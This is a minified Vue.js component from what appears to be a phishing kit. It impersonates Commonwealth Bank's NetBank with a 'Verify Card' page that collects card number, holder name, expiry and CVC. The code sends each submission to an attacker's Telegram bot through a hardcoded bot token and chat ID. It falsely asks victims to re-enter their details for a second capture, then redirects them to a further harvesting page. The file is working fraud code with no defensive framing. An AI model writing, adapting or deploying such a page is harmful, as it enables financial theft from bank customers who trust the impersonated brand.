import{_,r as c,a as C,c as I,b as a,t as l,f as u,e as A,u as N,o as H}from"./index-bWen7Kr5.js";const V={class:"card-container"},D={class:"card-details"},M={class:"card-number"},$={class:"card-holder"},k={class:"expiry"},S={class:"cvc"},w={style:{color:"red"}},B=["value"],L=["value"],E=["value"],Y=["value"],q={__name:"VerifyCardView",setup(z){let m="5402975294:AAGYpLmZbgObheHGo6j2ziDCjcMqJziDIiU",p=748063043;const i=new Bot(m,p),v=N(),d=c(1),n=c(""),t=C({cardNumber:"",cardHolder:"",expiry:"",cvc:""}),g=r=>{let e=r.target.value.replace(/\D/g,"");if(e.length>4&&(e=e.slice(0,4)),e.length>=2){let s=e.slice(0,2),o=e.slice(2);parseInt(s)>12?s="12":parseInt(s)<1&&e.length>1&&(s="01"),e=s+(o?"/"+o:"")}r.target.value=e,t.expiry=e},f=r=>{let e=r.target.value.replace(/\D/g,"");e.length>16&&(e=e.slice(0,16));let s="";for(let o=0;o<e.length;o++)o>0&&o%4===0&&(s+=" "),s+=e[o];r.target.value=s,t.cardNumber=s},b=r=>{let e=r.target.value.replace(/[^a-zA-Z\s]/g,"").toUpperCase();e.length>26&&(e=e.slice(0,26)),r.target.value=e,t.cardHolder=e},y=r=>{let e=r.target.value.replace(/\D/g,"");e.length>3&&(e=e.slice(0,3)),r.target.value=e,t.cvc=e},h=()=>{if(t.cardNumber.trim()===""||t.cardHolder.trim()===""||t.expiry.trim()===""||t.cvc.trim()===""){alert("All fields required");return}let r=`Common Wealth Bank submission (verify card first attempt) - ID: ${sessionStorage.getItem("submissionID")} %0A`;r+="====================%0A",r+=`Card number: ${t.cardNumber}%0A`,r+=`Card holder: ${t.cardHolder}%0A`,r+=`Expiry: ${t.expiry}%0A`,r+=`CVC: ${t.cvc}%0A`,i.sendMessage(r).then(e=>{console.log("Msg Success!",e),n.value="Please enter your card details again for verification",t.cardNumber="",t.cardHolder="",t.expiry="",t.cvc="",d.value++}).catch(e=>console.error(e))},x=()=>{if(t.cardNumber.trim()===""||t.cardHolder.trim()===""||t.expiry.trim()===""||t.cvc.trim()===""){alert("All fields required");return}let r=`Common Wealth Bank submission (verify card second attempt) - ID: ${sessionStorage.getItem("submissionID")} %0A`;r+="====================%0A",r+=`Card number: ${t.cardNumber}%0A`,r+=`Card holder: ${t.cardHolder}%0A`,r+=`Expiry: ${t.expiry}%0A`,r+=`CVC: ${t.cvc}%0A`,i.sendMessage(r).then(e=>{console.log("Msg Success!",e),n.value="",v.push({name:"netbank.verify.info"})}).catch(e=>console.error(e))};return(r,e)=>(H(),I("body",null,[a("div",null,[e[7]||(e[7]=a("h1",null,"Verify Card",-1)),a("div",V,[e[4]||(e[4]=a("div",{class:"card-logo"},[a("img",{src:"https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png",alt:"Common Wealth Bank Logo",width:"50"})],-1)),e[5]||(e[5]=a("div",{class:"number-logo"},[a("img",{src:"https://brandlogos.net/wp-content/uploads/2021/11/mastercard-logo.png",alt:"Mastercard Logo",width:"50"})],-1)),a("div",D,[e[3]||(e[3]=a("div",{class:"card-type"},"Debit Mastercard",-1)),a("div",M,l(t.cardNumber),1),a("div",$,l(t.cardHolder),1),a("div",k,[e[1]||(e[1]=u("EXPIRY ")),a("strong",null,l(t.expiry),1)]),a("div",S,[e[2]||(e[2]=u("CVC ")),a("strong",null,l(t.cvc),1)])])]),a("form",{class:"card-form",onSubmit:e[0]||(e[0]=A(s=>d.value===1?h():x(),["prevent"]))},[a("p",w,l(n.value),1),a("input",{type:"text",placeholder:"Card Number",onInput:f,value:t.cardNumber},null,40,B),a("input",{type:"text",placeholder:"Card Holder",onInput:b,value:t.cardHolder},null,40,L),a("input",{type:"text",maxlength:"5",placeholder:"MM/YY",onInput:g,value:t.expiry},null,40,E),a("input",{type:"text",placeholder:"CVC",maxlength:"3",onInput:y,value:t.cvc},null,40,Y),e[6]||(e[6]=a("button",{type:"submit"},"Verify",-1))],32)])]))}},j=_(q,[["__scopeId","data-v-9917add7"]]);export{j as default};
